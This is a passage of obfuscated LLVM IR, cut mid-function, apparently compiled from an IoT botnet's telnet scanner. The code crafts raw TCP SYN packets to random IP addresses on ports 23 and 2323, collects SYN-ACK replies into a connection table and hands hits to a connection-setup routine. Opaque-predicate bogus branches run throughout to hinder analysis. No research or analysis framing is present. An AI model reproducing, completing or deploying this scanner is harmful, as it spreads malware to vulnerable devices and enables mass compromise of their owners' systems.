  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %235
  %244 = load i32, i32* %1, align 4
  %245 = icmp slt i32 %244, 384
  %246 = load i32, i32* @x.53
  %247 = load i32, i32* @y.54
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %245, label %254, label %353

; <label>:254:                                    ; preds = %originalBBpart220
  %255 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %255, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %256 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i64 1
  %258 = bitcast %struct.iphdr* %257 to %struct.tcphdr*
  store %struct.tcphdr* %258, %struct.tcphdr** %16, align 8
  %259 = call i32 @rand_next()
  %260 = trunc i32 %259 to i16
  %261 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 3
  store i16 %260, i16* %262, align 4
  %263 = load i32, i32* @LOCAL_ADDR, align 4
  %264 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 8
  store i32 %263, i32* %265, align 4
  %266 = call i32 @get_random_ip()
  %267 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 9
  store i32 %266, i32* %268, align 4
  %269 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %272 = bitcast %struct.iphdr* %271 to i16*
  %273 = call zeroext i16 @checksum_generic(i16* %272, i32 20)
  %274 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 %273, i16* %275, align 2
  %276 = load i32, i32* %1, align 4
  %277 = srem i32 %276, 10
  %278 = icmp eq i32 %277, 0
  br i1 %278, label %279, label %283

; <label>:279:                                    ; preds = %254
  %280 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %281 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 1
  store i16 %280, i16* %282, align 2
  br label %287

; <label>:283:                                    ; preds = %254
  %284 = call zeroext i16 @htons(i16 zeroext 23) #7
  %285 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 1
  store i16 %284, i16* %286, align 2
  br label %287

; <label>:287:                                    ; preds = %283, %279
  %288 = load i32, i32* @x.53
  %289 = load i32, i32* @y.54
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %287
  %296 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 9
  %298 = load i32, i32* %297, align 4
  %299 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 2
  store i32 %298, i32* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 6
  store i16 0, i16* %302, align 4
  %303 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %305 = bitcast %struct.tcphdr* %304 to i8*
  %306 = call zeroext i16 @htons(i16 zeroext 20) #7
  %307 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %303, i8* %305, i16 zeroext %306, i32 20)
  %308 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 6
  store i16 %307, i16* %309, align 4
  %310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %310, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 9
  %313 = load i32, i32* %312, align 4
  %314 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %315 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %314, i32 0, i32 0
  store i32 %313, i32* %315, align 4
  %316 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 1
  %318 = load i16, i16* %317, align 2
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %318, i16* %319, align 2
  %320 = load i32, i32* @rsck, align 4
  %321 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %322 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %322, %struct.sockaddr** %321, align 8
  %323 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %324 = load %struct.sockaddr*, %struct.sockaddr** %323, align 8
  %325 = call i64 @sendto(i32 %320, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %324, i32 16)
  %326 = load i32, i32* @x.53
  %327 = load i32, i32* @y.54
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %334

; <label>:334:                                    ; preds = %originalBBpart224
  %335 = load i32, i32* @x.53
  %336 = load i32, i32* @y.54
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %334
  %343 = load i32, i32* %1, align 4
  %344 = add nsw i32 %343, 1
  store i32 %344, i32* %1, align 4
  %345 = load i32, i32* @x.53
  %346 = load i32, i32* @y.54
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart231, label %originalBB26alteredBB

originalBBpart231:                                ; preds = %originalBB26
  br label %235

; <label>:353:                                    ; preds = %originalBBpart220
  br label %354

; <label>:354:                                    ; preds = %353, %213
  store i32 0, i32* %9, align 4
  br label %355

; <label>:355:                                    ; preds = %originalBBpart294, %548, %536, %528, %504, %496, %originalBBpart243, %447, %414, %originalBBpart235, %384, %354
  %356 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %357 = bitcast i8* %356 to %struct.iphdr*
  store %struct.iphdr* %357, %struct.iphdr** %20, align 8
  %358 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i64 1
  %360 = bitcast %struct.iphdr* %359 to %struct.tcphdr*
  store %struct.tcphdr* %360, %struct.tcphdr** %21, align 8
  %361 = call i32* @__errno_location() #7
  store i32 0, i32* %361, align 4
  %362 = load i32, i32* @rsck, align 4
  %363 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %364 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %364, align 8
  %365 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %366 = load %struct.sockaddr*, %struct.sockaddr** %365, align 8
  %367 = call i64 @recvfrom(i32 %362, i8* %363, i64 1514, i32 16384, %struct.sockaddr* %366, i32* null)
  %368 = trunc i64 %367 to i32
  store i32 %368, i32* %18, align 4
  %369 = load i32, i32* %18, align 4
  %370 = icmp sle i32 %369, 0
  br i1 %370, label %379, label %371

; <label>:371:                                    ; preds = %355
  %372 = call i32* @__errno_location() #7
  %373 = load i32, i32* %372, align 4
  %374 = icmp eq i32 %373, 11
  br i1 %374, label %379, label %375

; <label>:375:                                    ; preds = %371
  %376 = call i32* @__errno_location() #7
  %377 = load i32, i32* %376, align 4
  %378 = icmp eq i32 %377, 11
  br i1 %378, label %379, label %380

; <label>:379:                                    ; preds = %375, %371, %355
  br label %668

; <label>:380:                                    ; preds = %375
  %381 = load i32, i32* %18, align 4
  %382 = sext i32 %381 to i64
  %383 = icmp ult i64 %382, 40
  br i1 %383, label %384, label %385

; <label>:384:                                    ; preds = %380
  br label %355

; <label>:385:                                    ; preds = %380
  %386 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 9
  %388 = load i32, i32* %387, align 4
  %389 = load i32, i32* @LOCAL_ADDR, align 4
  %390 = icmp ne i32 %388, %389
  br i1 %390, label %391, label %408

; <label>:391:                                    ; preds = %385
  %392 = load i32, i32* @x.53
  %393 = load i32, i32* @y.54
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %391
  %400 = load i32, i32* @x.53
  %401 = load i32, i32* @y.54
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %355

; <label>:408:                                    ; preds = %385
  %409 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 6
  %411 = load i8, i8* %410, align 1
  %412 = zext i8 %411 to i32
  %413 = icmp ne i32 %412, 6
  br i1 %413, label %414, label %415

; <label>:414:                                    ; preds = %408
  br label %355

; <label>:415:                                    ; preds = %408
  %416 = load i32, i32* @x.53
  %417 = load i32, i32* @y.54
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %415
  %424 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = load i16, i16* %425, align 4
  %427 = zext i16 %426 to i32
  %428 = call zeroext i16 @htons(i16 zeroext 23) #7
  %429 = zext i16 %428 to i32
  %430 = icmp ne i32 %427, %429
  %431 = load i32, i32* @x.53
  %432 = load i32, i32* @y.54
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %430, label %439, label %448

; <label>:439:                                    ; preds = %originalBBpart239
  %440 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 0
  %442 = load i16, i16* %441, align 4
  %443 = zext i16 %442 to i32
  %444 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %445 = zext i16 %444 to i32
  %446 = icmp ne i32 %443, %445
  br i1 %446, label %447, label %448

; <label>:447:                                    ; preds = %439
  br label %355

; <label>:448:                                    ; preds = %439, %originalBBpart239
  %449 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %450 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %449, i32 0, i32 1
  %451 = load i16, i16* %450, align 2
  %452 = zext i16 %451 to i32
  %453 = load i16, i16* %2, align 2
  %454 = zext i16 %453 to i32
  %455 = icmp ne i32 %452, %454
  br i1 %455, label %456, label %473

; <label>:456:                                    ; preds = %448
  %457 = load i32, i32* @x.53
  %458 = load i32, i32* @y.54
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %456
  %465 = load i32, i32* @x.53
  %466 = load i32, i32* @y.54
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %355

; <label>:473:                                    ; preds = %448
  %474 = load i32, i32* @x.53
  %475 = load i32, i32* @y.54
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %473
  %482 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 4
  %484 = load i16, i16* %483, align 4
  %485 = lshr i16 %484, 9
  %486 = and i16 %485, 1
  %487 = icmp ne i16 %486, 0
  %488 = load i32, i32* @x.53
  %489 = load i32, i32* @y.54
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart264, label %originalBB45alteredBB

originalBBpart264:                                ; preds = %originalBB45
  br i1 %487, label %497, label %496

; <label>:496:                                    ; preds = %originalBBpart264
  br label %355

; <label>:497:                                    ; preds = %originalBBpart264
  %498 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 4
  %500 = load i16, i16* %499, align 4
  %501 = lshr i16 %500, 12
  %502 = and i16 %501, 1
  %503 = icmp ne i16 %502, 0
  br i1 %503, label %505, label %504

; <label>:504:                                    ; preds = %497
  br label %355

; <label>:505:                                    ; preds = %497
  %506 = load i32, i32* @x.53
  %507 = load i32, i32* @y.54
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %505
  %514 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 4
  %516 = load i16, i16* %515, align 4
  %517 = lshr i16 %516, 10
  %518 = and i16 %517, 1
  %519 = icmp ne i16 %518, 0
  %520 = load i32, i32* @x.53
  %521 = load i32, i32* @y.54
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart272, label %originalBB66alteredBB

originalBBpart272:                                ; preds = %originalBB66
  br i1 %519, label %528, label %529

; <label>:528:                                    ; preds = %originalBBpart272
  br label %355

; <label>:529:                                    ; preds = %originalBBpart272
  %530 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 4
  %532 = load i16, i16* %531, align 4
  %533 = lshr i16 %532, 8
  %534 = and i16 %533, 1
  %535 = icmp ne i16 %534, 0
  br i1 %535, label %536, label %537

; <label>:536:                                    ; preds = %529
  br label %355

; <label>:537:                                    ; preds = %529
  %538 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 3
  %540 = load i32, i32* %539, align 4
  %541 = call i32 @ntohl(i32 %540) #7
  %542 = sub i32 %541, 1
  %543 = call i32 @htonl(i32 %542) #7
  %544 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 8
  %546 = load i32, i32* %545, align 4
  %547 = icmp ne i32 %543, %546
  br i1 %547, label %548, label %549

; <label>:548:                                    ; preds = %537
  br label %355

; <label>:549:                                    ; preds = %537
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %550 = load i32, i32* %9, align 4
  store i32 %550, i32* %18, align 4
  br label %551

; <label>:551:                                    ; preds = %originalBBpart286, %549
  %552 = load i32, i32* %18, align 4
  %553 = icmp slt i32 %552, 256
  br i1 %553, label %554, label %620

; <label>:554:                                    ; preds = %551
  %555 = load i32, i32* @x.53
  %556 = load i32, i32* @y.54
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %554
  %563 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %564 = load i32, i32* %18, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %563, i64 %565
  %567 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %566, i32 0, i32 3
  %568 = load i32, i32* %567, align 8
  %569 = icmp eq i32 %568, 0
  %570 = load i32, i32* @x.53
  %571 = load i32, i32* @y.54
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %569, label %578, label %600

; <label>:578:                                    ; preds = %originalBBpart276
  %579 = load i32, i32* @x.53
  %580 = load i32, i32* @y.54
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %578
  %587 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %588 = load i32, i32* %18, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %587, i64 %589
  store %struct.scanner_connection* %590, %struct.scanner_connection** %22, align 8
  %591 = load i32, i32* %18, align 4
  store i32 %591, i32* %9, align 4
  %592 = load i32, i32* @x.53
  %593 = load i32, i32* @y.54
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %620

; <label>:600:                                    ; preds = %originalBBpart276
  br label %601

; <label>:601:                                    ; preds = %600
  %602 = load i32, i32* @x.53
  %603 = load i32, i32* @y.54
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %601
  %610 = load i32, i32* %18, align 4
  %611 = add nsw i32 %610, 1
  store i32 %611, i32* %18, align 4
  %612 = load i32, i32* @x.53
  %613 = load i32, i32* @y.54
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart286, label %originalBB82alteredBB

originalBBpart286:                                ; preds = %originalBB82
  br label %551

; <label>:620:                                    ; preds = %originalBBpart280, %551
  %621 = load i32, i32* @x.53
  %622 = load i32, i32* @y.54
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %620
  %629 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %630 = icmp eq %struct.scanner_connection* %629, null
  %631 = load i32, i32* @x.53
  %632 = load i32, i32* @y.54
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %630, label %639, label %640

; <label>:639:                                    ; preds = %originalBBpart290
  br label %668

; <label>:640:                                    ; preds = %originalBBpart290
  %641 = load i32, i32* @x.53
  %642 = load i32, i32* @y.54
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %640
  %649 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %650 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %649, i32 0, i32 8
  %651 = load i32, i32* %650, align 4
  %652 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %653 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %652, i32 0, i32 4
  store i32 %651, i32* %653, align 4
  %654 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %655 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %654, i32 0, i32 0
  %656 = load i16, i16* %655, align 4
  %657 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %658 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %657, i32 0, i32 5
  store i16 %656, i16* %658, align 8
  %659 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %659)
  %660 = load i32, i32* @x.53
  %661 = load i32, i32* @y.54
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %355

; <label>:668:                                    ; preds = %639, %379
  br label %669

; <label>:669:                                    ; preds = %668
  %670 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %671 = getelementptr inbounds [16 x i64], [16 x i64]* %670, i64 0, i64 0
  %672 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %671) #6, !srcloc !1
  %673 = extractvalue { i64, i64* } %672, 0
  %674 = extractvalue { i64, i64* } %672, 1
  %675 = trunc i64 %673 to i32
  store i32 %675, i32* %24, align 4
  %676 = ptrtoint i64* %674 to i64
  %677 = trunc i64 %676 to i32
  store i32 %677, i32* %25, align 4
  br label %678

; <label>:678:                                    ; preds = %669
  br label %679

; <label>:679:                                    ; preds = %678
  %680 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %6, i32 0, i32 0
  %681 = getelementptr inbounds [16 x i64], [16 x i64]* %680, i64 0, i64 0
  %682 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %681) #6, !srcloc !2
  %683 = extractvalue { i64, i64* } %682, 0
  %684 = extractvalue { i64, i64* } %682, 1
  %685 = trunc i64 %683 to i32
  store i32 %685, i32* %26, align 4
  %686 = ptrtoint i64* %684 to i64
  %687 = trunc i64 %686 to i32
  store i32 %687, i32* %27, align 4
  br label %688

; <label>:688:                                    ; preds = %679
  store i32 0, i32* %1, align 4
  br label %689

; <label>:689:                                    ; preds = %938, %688
  %690 = load i32, i32* @x.53
  %691 = load i32, i32* @y.54
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %689
  %698 = load i32, i32* %1, align 4
  %699 = icmp slt i32 %698, 256
  %700 = load i32, i32* @x.53
  %701 = load i32, i32* @y.54
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %699, label %708, label %941

; <label>:708:                                    ; preds = %originalBBpart298
  %709 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %710 = load i32, i32* %1, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %709, i64 %711
  store %struct.scanner_connection* %712, %struct.scanner_connection** %7, align 8
  %713 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %714 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %713, i32 0, i32 3
  %715 = load i32, i32* %714, align 8
  %716 = icmp ugt i32 %715, 1
  %717 = select i1 %716, i32 30, i32 5
  store i32 %717, i32* %28, align 4
  %718 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %719 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %718, i32 0, i32 3
  %720 = load i32, i32* %719, align 8
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %722, label %810

; <label>:722:                                    ; preds = %708
  %723 = load i32, i32* @fake_time, align 4
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 2
  %726 = load i32, i32* %725, align 4
  %727 = sub i32 %723, %726
  %728 = load i32, i32* %28, align 4
  %729 = icmp ugt i32 %727, %728
  br i1 %729, label %730, label %810

; <label>:730:                                    ; preds = %722
  %731 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %732 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %731, i32 0, i32 1
  %733 = load i32, i32* %732, align 8
  %734 = call i32 @close(i32 %733)
  %735 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %736 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %735, i32 0, i32 1
  store i32 -1, i32* %736, align 8
  %737 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %738 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %737, i32 0, i32 3
  %739 = load i32, i32* %738, align 8
  %740 = icmp ugt i32 %739, 2
  br i1 %740, label %741, label %788

; <label>:741:                                    ; preds = %730
  %742 = load i32, i32* @x.53
  %743 = load i32, i32* @y.54
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
